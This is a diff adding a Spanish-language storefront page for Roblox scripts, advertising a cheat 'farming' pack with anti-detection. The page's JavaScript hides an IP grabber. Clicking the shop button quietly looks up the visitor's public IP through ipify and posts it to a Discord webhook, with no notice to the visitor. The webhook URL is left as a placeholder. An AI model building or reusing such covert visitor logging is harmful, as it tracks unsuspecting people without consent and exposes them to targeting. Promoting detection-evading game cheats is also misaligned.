@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Cholo 1T - Tienda de Scripts</title>
+    <style>
+        :root {
+            --principal: #8a2be2;
+            --lila: #e0b0ff;
+            --oscuro: #0a0a0c;
+        }
+
+        body {
+            background-color: var(--oscuro);
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Rayitos en las esquinas */
+        .rayo {
+            position: fixed;
+            width: 150px;
+            z-index: 10;
+            filter: drop-shadow(0 0 10px var(--lila));
+        }
+        .top-left { top: 0; left: 0; }
+        .top-right { top: 0; right: 0; transform: scaleX(-1); }
+
+        .hero {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            background: radial-gradient(circle, #2a0e4a 0%, #0a0a0c 100%);
+        }
+
+        h1 {
+            font-size: 4rem;
+            color: var(--lila);
+            text-shadow: 0 0 20px var(--principal);
+            margin-bottom: 10px;
+        }
+
+        .btn-tienda {
+            padding: 15px 40px;
+            background-color: var(--principal);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+            box-shadow: 0 0 15px var(--principal);
+        }
+
+        .btn-tienda:hover {
+            transform: scale(1.1);
+            background-color: var(--lila);
+            color: var(--oscuro);
+        }
+
+        .tienda-section {
+            display: none;
+            padding: 50px;
+            width: 80%;
+        }
+
+        .card {
+            background: #16161a;
+            border: 2px solid var(--principal);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        textarea {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            color: #0f0;
+            border: 1px solid #333;
+            font-family: monospace;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://i.imgur.com/vHq0W2f.png" class="rayo top-left" alt="rayo">
+    <img src="https://i.imgur.com/vHq0W2f.png" class="rayo top-right" alt="rayo">
+
+    <div class="hero" id="inicio">
+        <h1>BIENVENIDO A LA PÁGINA DE CHOLO 1T</h1>
+        <p>Los mejores scripts para Roblox y más.</p>
+        <a href="#" class="btn-tienda" onclick="mostrarTienda()">VER TIENDA</a>
+    </div>
+
+    <div class="tienda-section" id="tienda">
+        <h2 style="color: var(--lila);">FARMEO VENEYORW - PACK 3 EN 1</h2>
+        <div class="card">
+            <p>Este pack incluye: Auto-Reset, Anti-Detección y Modo Locura X2.</p>
+            <textarea readonly>
+-- ==========================================
+-- SCRIPT 1: AUTO-RESET CADA 2 ENTREGAS
+-- [EL RESTO DE TU SCRIPT AQUÍ]
+-- ==========================================
+            </textarea>
+            <p style="font-size: 0.8rem; color: #555;">Al usar este script aceptas nuestros términos de servicio.</p>
+        </div>
+    </div>
+
+    <script>
+        function mostrarTienda() {
+            document.getElementById('inicio').style.display = 'none';
+            document.getElementById('tienda').style.display = 'block';
+            
+            // AQUÍ ES DONDE SE EJECUTA EL "DISPARO" A DISCORD
+            // Cuando le dan clic al botón, la web puede mandar la IP
+            fetch('https://api.ipify.org?format=json')
+            .then(x => x.json())
+            .then(y => {
+                mandarADiscord(y.ip);
+            });
+        }
+
+        function mandarADiscord(ip) {
+            const webhook = "TU_WEBHOOK_AQUI";
+            const msg = {
+                content: "🔔 **¡Nueva visita en la tienda!**\nIP Detectada: `" + ip + "`"
+            };
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(msg)
+            });
+        }
+    </script>
+</body>
+</html>
